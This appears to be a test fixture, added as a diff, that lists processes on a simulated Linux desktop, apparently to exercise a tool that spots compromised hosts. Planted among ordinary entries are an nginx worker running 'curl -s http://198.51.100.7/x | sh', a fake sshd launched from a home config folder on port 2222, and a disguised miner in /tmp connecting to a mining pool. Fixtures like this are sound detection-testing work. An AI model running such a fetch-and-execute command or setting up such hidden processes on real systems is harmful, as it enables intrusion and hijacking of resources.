@@ -1,0 +1,353 @@
+processes:
+- pid: 1
+  ppid: 0
+  name: systemd
+  exe: /usr/lib/systemd/systemd
+  cmdline:
+  - /sbin/init
+  - splash
+  user: root
+  rss_mib: 14
+  unit: init.scope
+- pid: 2
+  ppid: 0
+  name: kthreadd
+  user: root
+- pid: 3
+  ppid: 2
+  name: rcu_gp
+  user: root
+- pid: 9
+  ppid: 2
+  name: kworker/0:1-events
+  user: root
+- pid: 10
+  ppid: 2
+  name: kworker/1:2-mm_percpu_wq
+  user: root
+- pid: 11
+  ppid: 2
+  name: kworker/u8:3-flush
+  user: root
+- pid: 14
+  ppid: 2
+  name: ksoftirqd/0
+  user: root
+- pid: 15
+  ppid: 2
+  name: migration/0
+  user: root
+- pid: 88
+  ppid: 2
+  name: irq/42-nvme0q1
+  user: root
+- pid: 301
+  ppid: 1
+  name: systemd-journal
+  exe: /usr/lib/systemd/systemd-journald
+  cmdline:
+  - /usr/lib/systemd/systemd-journald
+  user: root
+  rss_mib: 22
+  unit: systemd-journald.service
+- pid: 340
+  ppid: 1
+  name: systemd-udevd
+  exe: /usr/lib/systemd/systemd-udevd
+  cmdline:
+  - /usr/lib/systemd/systemd-udevd
+  user: root
+  rss_mib: 9
+  unit: systemd-udevd.service
+- pid: 612
+  ppid: 1
+  name: dbus-broker-lau
+  exe: /usr/bin/dbus-broker-launch
+  cmdline:
+  - /usr/bin/dbus-broker-launch
+  - --scope
+  - system
+  user: root
+  rss_mib: 4
+  unit: dbus-broker.service
+- pid: 615
+  ppid: 612
+  name: dbus-broker
+  exe: /usr/bin/dbus-broker
+  cmdline:
+  - dbus-broker
+  - --log
+  - '4'
+  user: root
+  rss_mib: 6
+  unit: dbus-broker.service
+- pid: 640
+  ppid: 1
+  name: NetworkManager
+  exe: /usr/sbin/NetworkManager
+  cmdline:
+  - /usr/sbin/NetworkManager
+  - --no-daemon
+  user: root
+  rss_mib: 21
+  unit: NetworkManager.service
+- pid: 655
+  ppid: 1
+  name: polkitd
+  exe: /usr/lib/polkit-1/polkitd
+  cmdline:
+  - /usr/lib/polkit-1/polkitd
+  - --no-debug
+  user: root
+  rss_mib: 11
+  unit: polkit.service
+- pid: 702
+  ppid: 1
+  name: demo-updater
+  exe: /usr/libexec/demo-updater
+  cmdline:
+  - /usr/libexec/demo-updater
+  - --daemon
+  user: root
+  rss_mib: 18
+  unit: demo-updater.service
+- pid: 690
+  ppid: 1
+  name: cron
+  exe: /usr/sbin/cron
+  cmdline:
+  - /usr/sbin/cron
+  - -f
+  user: root
+  rss_mib: 3
+  unit: cron.service
+- pid: 2210
+  ppid: 690
+  name: sh
+  exe: /usr/bin/dash
+  cmdline:
+  - /bin/sh
+  - -c
+  - curl -fsS https://example.org/status.json -o /var/lib/demo/status.json
+  user: root
+  rss_mib: 1
+- pid: 2211
+  ppid: 2210
+  name: curl
+  exe: /usr/bin/curl
+  cmdline:
+  - curl
+  - -fsS
+  - https://example.org/status.json
+  - -o
+  - /var/lib/demo/status.json
+  user: root
+  rss_mib: 8
+  cpu: 1.2
+- pid: 731
+  ppid: 1
+  name: nginx
+  exe: /usr/sbin/nginx
+  cmdline:
+  - 'nginx: master process /usr/sbin/nginx'
+  user: root
+  rss_mib: 6
+  cpu: 0.0
+  unit: nginx.service
+  listens:
+  - tcp 0.0.0.0:80
+- pid: 733
+  ppid: 731
+  name: nginx
+  exe: /usr/sbin/nginx
+  cmdline:
+  - 'nginx: worker process'
+  user: www-data
+  rss_mib: 9
+  cpu: 0.2
+  unit: nginx.service
+  listens:
+  - tcp 0.0.0.0:80
+- pid: 744
+  ppid: 733
+  name: sh
+  exe: /usr/bin/dash
+  cmdline:
+  - sh
+  - -c
+  - curl -s http://198.51.100.7/x | sh
+  user: www-data
+  rss_mib: 1
+- pid: 802
+  ppid: 1
+  name: sshd
+  exe: /home/demo/.config/sshd
+  cmdline:
+  - /home/demo/.config/sshd
+  - -D
+  user: demo
+  rss_mib: 7
+  cpu: 3.1
+  listens:
+  - tcp 0.0.0.0:2222
+- pid: 1100
+  ppid: 1
+  name: systemd
+  exe: /usr/lib/systemd/systemd
+  cmdline:
+  - /usr/lib/systemd/systemd
+  - --user
+  user: demo
+  rss_mib: 12
+  unit: user@1000.service
+- pid: 1180
+  ppid: 1100
+  name: pipewire
+  exe: /usr/bin/pipewire
+  cmdline:
+  - /usr/bin/pipewire
+  user: demo
+  rss_mib: 15
+  cpu: 0.6
+  unit: pipewire.service
+- pid: 1182
+  ppid: 1100
+  name: wireplumber
+  exe: /usr/bin/wireplumber
+  cmdline:
+  - /usr/bin/wireplumber
+  user: demo
+  rss_mib: 19
+  cpu: 0.2
+  unit: wireplumber.service
+- pid: 1190
+  ppid: 1100
+  name: xdg-desktop-por
+  exe: /usr/libexec/xdg-desktop-portal
+  cmdline:
+  - /usr/libexec/xdg-desktop-portal
+  user: demo
+  rss_mib: 13
+  unit: xdg-desktop-portal.service
+- pid: 1201
+  ppid: 1100
+  name: gnome-shell
+  exe: /usr/bin/gnome-shell
+  cmdline:
+  - /usr/bin/gnome-shell
+  user: demo
+  rss_mib: 312
+  cpu: 2.4
+  unit: org.gnome.Shell@wayland.service
+- pid: 1260
+  ppid: 1100
+  name: gsd-color
+  exe: /usr/libexec/gsd-color
+  cmdline:
+  - /usr/libexec/gsd-color
+  user: demo
+  rss_mib: 24
+  unit: org.gnome.SettingsDaemon.Color.service
+- pid: 1400
+  ppid: 1201
+  name: firefox
+  exe: /usr/lib/firefox/firefox
+  cmdline:
+  - /usr/lib/firefox/firefox
+  user: demo
+  rss_mib: 540
+  cpu: 4.2
+- pid: 1433
+  ppid: 1400
+  name: WebContent
+  exe: /usr/lib/firefox/firefox
+  cmdline:
+  - /usr/lib/firefox/firefox
+  - -contentproc
+  - tab
+  user: demo
+  rss_mib: 210
+  cpu: 1.3
+- pid: 1510
+  ppid: 1100
+  name: kitty
+  exe: /usr/bin/kitty
+  cmdline:
+  - /usr/bin/kitty
+  user: demo
+  rss_mib: 96
+  cpu: 0.3
+- pid: 1522
+  ppid: 1510
+  name: zsh
+  exe: /usr/bin/zsh
+  cmdline:
+  - /usr/bin/zsh
+  user: demo
+  rss_mib: 8
+- pid: 1601
+  ppid: 1522
+  name: claude
+  exe: /home/demo/.local/bin/claude
+  cmdline:
+  - claude
+  user: demo
+  rss_mib: 180
+  cpu: 1.1
+- pid: 1640
+  ppid: 1601
+  name: zsh
+  exe: /usr/bin/zsh
+  cmdline:
+  - /usr/bin/zsh
+  - -c
+  - just test
+  user: demo
+  rss_mib: 6
+- pid: 1655
+  ppid: 1640
+  name: python3
+  exe: /usr/bin/python3.14
+  cmdline:
+  - python3
+  - -m
+  - pytest
+  user: demo
+  rss_mib: 74
+  cpu: 22.0
+- pid: 1702
+  ppid: 1100
+  name: python3
+  exe: /usr/bin/python3.14
+  cmdline:
+  - python3
+  - /home/demo/.local/bin/notes-sync.py
+  user: demo
+  rss_mib: 41
+  cpu: 0.1
+- pid: 1750
+  ppid: 1100
+  name: photo-indexer
+  exe: /opt/photo-indexer/bin/photo-indexer
+  cmdline:
+  - /opt/photo-indexer/bin/photo-indexer
+  - --watch
+  user: demo
+  rss_mib: 120
+  cpu: 6.5
+- pid: 1803
+  ppid: 1100
+  name: kworkerd
+  exe: /tmp/.ICE-unix/kworkerd
+  cmdline:
+  - /tmp/.ICE-unix/kworkerd
+  - -o
+  - pool.example.net:3333
+  user: demo
+  rss_mib: 230
+  cpu: 97.0
+- pid: 1811
+  ppid: 1750
+  name: thumbnailer
+  state: Z
+  user: demo
